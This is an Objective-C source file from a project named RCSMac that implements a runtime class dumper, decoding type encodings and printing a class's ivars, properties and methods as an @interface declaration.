//
//  File.c
//  RCSMac
//
//  Created by armored on 29/05/14.
//
//
#include <CoreFoundation/CoreFoundation.h>
#include "RCSMLogger.h"
#include <stdio.h>
#include <objc/runtime.h>
#include <dlfcn.h>


NSArray *typeStringFromEncoding(const char *typeEncoding, NSUInteger *end);

#define COMPARE_ENC_CUSTOM(var, type) do { \
if(var == @encode(type)[0]) { \
return @#type; \
} \
} while(0)

#define COMPARE_ENC(type) COMPARE_ENC_CUSTOM(firstChar, type)

NSString *basicTypeFromEncoding(const char *encoding) {
	char firstChar = encoding[0];
	
	COMPARE_ENC(char);
	COMPARE_ENC(int);
	COMPARE_ENC(short);
	COMPARE_ENC(long);
	COMPARE_ENC(long long);
	COMPARE_ENC(unsigned char);
	COMPARE_ENC(unsigned int);
	COMPARE_ENC(unsigned short);
	COMPARE_ENC(unsigned long);
	COMPARE_ENC(unsigned long long);
	COMPARE_ENC(float);
	COMPARE_ENC(double);
	COMPARE_ENC(_Bool);
	COMPARE_ENC(void);
	COMPARE_ENC(char *);
	COMPARE_ENC(id);
	COMPARE_ENC(Class);
	COMPARE_ENC(SEL);
	
	if(encoding[0] == '?') {
		return @"void *";
	}
	
	return nil;
}

NSUInteger findClosedBracket(NSString *string) {
	NSUInteger length = [string length];
	NSUInteger i = 0;
	NSUInteger depth = 0;
	BOOL foundFirst = NO;
	while((!foundFirst || depth > 0) && i < length) {
		char c = [string characterAtIndex:i];
		switch(c) {
			case '(':
			case '[':
			case '{':
				depth++;
				foundFirst = YES;
				break;
			case ')':
			case ']':
			case '}':
				depth--;
				break;
		}
		
		i++;
	}
	
	return i - 1;
}

NSString *variableDefinitionWithName(const char *typeEncoding, const char *name) {
	NSArray *typeString = typeStringFromEncoding(typeEncoding, NULL);
	return [NSString stringWithFormat:@"%@ %s%@;", [typeString objectAtIndex:0], name, [typeString objectAtIndex:1]];
}

NSArray *typeStringFromEncoding(const char *typeEncoding, NSUInteger *end) {
	if(typeEncoding[0] == '\0') {
		return @[@"void", @""];
	}
	
	NSDictionary *qualifiers = @{
    @"r": @"const",
    @"n": @"in",
    @"N": @"inout",
    @"o": @"out",
    @"O": @"bycopy",
    @"R": @"byref",
    @"V": @"oneway"
  };
	
	NSUInteger dummy;
	if(!end) {
		end = &dummy;
	}
	
	NSMutableString *typePrefix = [NSMutableString new];
	NSMutableString *typeSuffix = [NSMutableString new];
	
	NSString *typeEnc = [NSString stringWithUTF8String:typeEncoding];
	
	BOOL isArray = [typeEnc hasPrefix:@"["];
	BOOL isStruct = [typeEnc hasPrefix:@"{"];
	BOOL isUnion = [typeEnc hasPrefix:@"("];
	
	NSString *qualifier = [qualifiers objectForKey:[typeEnc substringToIndex:1]];
	
	if(isArray || isStruct || isUnion) {
		NSUInteger endOfBracket = findClosedBracket(typeEnc);
		
		if(isArray) {
			NSScanner *scanner = [NSScanner scannerWithString:typeEnc];
			scanner.scanLocation = 1;
			int size;
			assert([scanner scanInt:&size]);
			
			[typeSuffix appendFormat:@"[%d]", size];
			
			NSString *inner = [typeEnc substringWithRange:NSMakeRange(scanner.scanLocation, endOfBracket - scanner.scanLocation)];
			NSUInteger innerEnd;
			NSArray *innerType = typeStringFromEncoding([inner UTF8String], &innerEnd);
			
			assert(scanner.scanLocation + innerEnd == endOfBracket);
			
			[typePrefix appendString:[innerType objectAtIndex:0]];
			[typeSuffix appendString:[innerType objectAtIndex:1]];
		} else {
			NSString *name;
			
			[typePrefix appendString:isStruct? @"struct ": @"union "];
			
			const char *equals = strchr(typeEncoding, '=');
			unsigned long index = 0;
			
			if(!equals) {
				name = [typeEnc substringWithRange:NSMakeRange(1, endOfBracket - 1)];
			} else {
				index = equals - typeEncoding;
				
				name = [typeEnc substringWithRange:NSMakeRange(1, index - 1)];
			}
			
			if(![name isEqualToString:@"?"]) {
				[typePrefix appendFormat:@"%@ ", name];
			}
			
			const char *ptr = typeEncoding + index + 1;
			
			if(equals && ptr - typeEncoding < endOfBracket) {
				[typePrefix appendString:@"{ "];
				
				int fieldIndex = 0;
				
				while(ptr - typeEncoding < endOfBracket) {
					NSString *fieldName = [NSString stringWithFormat:@"field%d", fieldIndex];
					
					if(*ptr == '"') {
						ptr++;
						char *fieldNameEnd = strchr(ptr, '"');
						assert(fieldNameEnd);
						
						fieldName = [[NSString alloc] initWithBytes:ptr length:(fieldNameEnd - ptr) encoding:NSUTF8StringEncoding];
						
						ptr = fieldNameEnd + 1;
					}
					
					NSUInteger fieldEnd;
					NSArray *fieldType = typeStringFromEncoding(ptr, &fieldEnd);
					[typePrefix appendFormat:@"%@ %@%@; ", [fieldType objectAtIndex:0], fieldName, [ fieldType objectAtIndex:1]];
					
					fieldIndex++;
					ptr += fieldEnd;
				}
				
				[typePrefix appendString:@"}"];
			}
		}
		
		*end = endOfBracket + 1;
		
	} else if([typeEnc hasPrefix:@"b"]) {
		NSScanner *scanner = [NSScanner scannerWithString:typeEnc];
		scanner.scanLocation = 1;
		int size;
		assert([scanner scanInt:&size]);
		
		[typePrefix appendString:@"unsigned long long"];
		[typeSuffix appendFormat:@":%d", size];
		
		*end = scanner.scanLocation;
	} else if([typeEnc hasPrefix:@"^"]) {
		*end = 0;
		
		while(typeEncoding[0] == '^') {
			[typePrefix appendString:@"*"];
			typeEncoding++;
			(*end)++;
		}
		
		NSUInteger pointerEnd;
		NSArray *pointerType = typeStringFromEncoding(typeEncoding, &pointerEnd);
		
		if([ [pointerType objectAtIndex:1] isNotEqualTo:@""]) {
			[typePrefix insertString:@"(" atIndex:0];
			[typeSuffix appendString:@") "];
			[typeSuffix appendString: [pointerType objectAtIndex:1]];
		}
		
		[typePrefix insertString: [pointerType objectAtIndex:0] atIndex:0];
		
		*end += pointerEnd;
	} else if(qualifier) {
		[typePrefix appendFormat:@"%@ ", qualifier];
		
		NSUInteger realEnd;
		NSArray *realType = typeStringFromEncoding(typeEncoding + 1, &realEnd);
		
		[typePrefix appendString: [realType objectAtIndex:0]];
		[typeSuffix appendString: [realType objectAtIndex:1]];
		
		*end = realEnd + 1;
	} else if([typeEnc hasPrefix:@"\""]) {
		// This occurs sometimes, but I forgot what to do :/
		assert(0);
	} else {
		NSString *basicType = basicTypeFromEncoding(typeEncoding);
		//assert(basicType);
		if(!basicType) {
			NSLog(@"%s", typeEncoding);
			basicType = @"void *";
		}
		
		if([basicType isEqualToString:@"id"] && typeEncoding[1] == '"') {
			const char *ptr = typeEncoding + 1;
			ptr++;
			char *classNameEnd = strchr(ptr, '"');
			assert(classNameEnd);
			
			NSString *className = [[NSString alloc] initWithBytes:ptr length:(classNameEnd - ptr) encoding:NSUTF8StringEncoding];
      
			[typePrefix insertString:[NSString stringWithFormat:@"%@ *", className] atIndex:0];
			
			*end = classNameEnd - typeEncoding + 1;
		} else {
			[typePrefix insertString:basicType atIndex:0];
			*end = 1;
		}
	}
	
	return @[typePrefix, typeSuffix];
}

NSString *methodArgTypeString(const char *typeEncoding) {
  NSArray *typeString = typeStringFromEncoding(typeEncoding, NULL);
  return [typeString componentsJoinedByString:@""];
}

NSString *class_dump_class(Class class) {
	NSMutableString *result = [NSMutableString new];
	
	const char *className = class_getName(class);
  
	infoLog(@"Class %s", className);
	
  [result appendFormat:@"@interface %s", className];
	
	Class superclass = class_getSuperclass(class);
	if(superclass) {
		const char *superClassName = class_getName(superclass);
    infoLog(@"Class %s, SuperClass %s", className, superClassName);
		[result appendFormat:@" : %s", superClassName];
	}
	
	unsigned int protocolCount;
	Protocol *__unsafe_unretained *protocols = class_copyProtocolList(class, &protocolCount);
	
	if(protocols) {
		if(protocolCount > 0) {
			[result appendString:@" <"];
			for(unsigned int i = 0; i < protocolCount; i++) {
				const char *protocolName = protocol_getName(protocols[i]);
				[result appendFormat:@"%s%s", (i == 0? "": ", "), protocolName];
			}
			[result appendString:@">"];
		}
		
		free(protocols);
	}
	
	unsigned int ivarCount;
	Ivar *ivars = class_copyIvarList(class, &ivarCount);
	
	if(ivars) {
		if(ivarCount > 0) {
			[result appendString:@" {\n"];
			
			for(unsigned int i = 0; i < ivarCount; i++) {
				Ivar ivar = ivars[i];
				const char *ivarName = ivar_getName(ivar);
				const char *ivarTypeEncoding = ivar_getTypeEncoding(ivar);
				
				[result appendFormat:@"\t%@\n", variableDefinitionWithName(ivarTypeEncoding, ivarName)];
				
			}
			
			[result appendString:@"}"];
		}
		
		free(ivars);
	}
	
	[result appendString:@"\n\n"];
	
	unsigned int propertyCount;
	objc_property_t *properties = class_copyPropertyList(class, &propertyCount);
	
	if(properties) {
		for(unsigned int i = 0; i < propertyCount; i++) {
			objc_property_t property = properties[i];
			const char *propertyName = property_getName(property);
			
			unsigned int propertyAttributeCount;
			objc_property_attribute_t *propertyAttributes = property_copyAttributeList(property, &propertyAttributeCount);
			
			BOOL isDynamic = NO;
			NSMutableString *attributesString = [NSMutableString new];
			char *typeEncoding = NULL;
			
			if(propertyAttributes) {
				BOOL firstAttribute = YES;
				for(unsigned int j = 0; j < propertyAttributeCount; j++) {
					objc_property_attribute_t *propertyAttribute = propertyAttributes + j;
					
					NSString *attribute = nil;
					const char *attributeValue = nil;
					
					switch(propertyAttribute->name[0]) {
						case 'V':
							break;
						case 'T':
							typeEncoding = strdup(propertyAttribute->value);
							break;
						case 'R':
							attribute = @"readonly";
							break;
						case 'C':
							attribute = @"copy";
							break;
						case '&':
							attribute = @"retain";
							break;
						case 'N':
							attribute = @"nonatomic";
							break;
						case 'G':
							attribute = @"getter";
							attributeValue = propertyAttribute->value;
							break;
						case 'S':
							attribute = @"setter";
							attributeValue = propertyAttribute->value;
							break;
						case 'D':
							isDynamic = YES;
							break;
						case 'W':
							attribute = @"__weak";
							break;
						case 'P':
							// Garbage collection
							break;
						case 't':
							assert(0);
							break;
						default:
							assert(0);
							break;
					}
					
					if(attribute) {
						if(firstAttribute) {
							[attributesString appendString:@"("];
							
							firstAttribute = NO;
						} else {
							[attributesString appendString:@", "];
						}
						
						[attributesString appendString:attribute];
						
						if(attributeValue) {
							[attributesString appendFormat:@"=%s", attributeValue];
						}
					}
				}
				
				if(!firstAttribute) {
					[attributesString appendFormat:@") "];
				}
				
				free(propertyAttributes);
			}
			
			assert(typeEncoding);
			
			NSString *propertyType = methodArgTypeString(typeEncoding);
			
			[result appendFormat:@"@property %@%@ %s;\n", attributesString, propertyType, propertyName];
			
			free(typeEncoding);
		}
		
		free(properties);
		
		[result appendString:@"\n"];
	}
	
	for(int m = 0; m < 2; m++) {
		unsigned int methodCount;
		Method *methods = class_copyMethodList(m? class: objc_getMetaClass(className), &methodCount);
		
		if(methods) {
			for(unsigned int i = 0; i < methodCount; i++) {
				[result appendString:m? @"- ": @"+ "];
				
				Method method = methods[i];
				
				char *returnTypeEncoding = method_copyReturnType(method);
				NSString *returnType = methodArgTypeString(returnTypeEncoding);
				free(returnTypeEncoding);
				
				[result appendFormat:@"(%@)", returnType];
				
				const char *methodName = sel_getName(method_getName(method));
				NSString *methodString = [NSString stringWithUTF8String:methodName];
				
				NSArray *methodParts = [methodString componentsSeparatedByString:@":"];
				
				[result appendString:(NSString *) [methodParts objectAtIndex:0]];
				
				unsigned int argCount = method_getNumberOfArguments(method);
				if(argCount == 0) {
					argCount = 2;
				}
				
				assert(argCount - 2 == [methodParts count] - 1);
				
				for(unsigned int j = 0; j < argCount - 2; j++) {
					char *argTypeEncoding = method_copyArgumentType(method, j + 2);
					NSString *argType = methodArgTypeString(argTypeEncoding);
					free(argTypeEncoding);
					
					if(j != 0) {
						[result appendFormat:@" %@", (NSString *)[methodParts objectAtIndex:j]];
					}
					[result appendFormat:@":(%@)arg%d", argType, j];
				}
				
				[result appendString:@";\n"];
			}
			
			free(methods);
			
			[result appendString:@"\n"];
		}
	}
	
	[result appendString:@"@end"];
	
  infoLog(result);
	return result;
}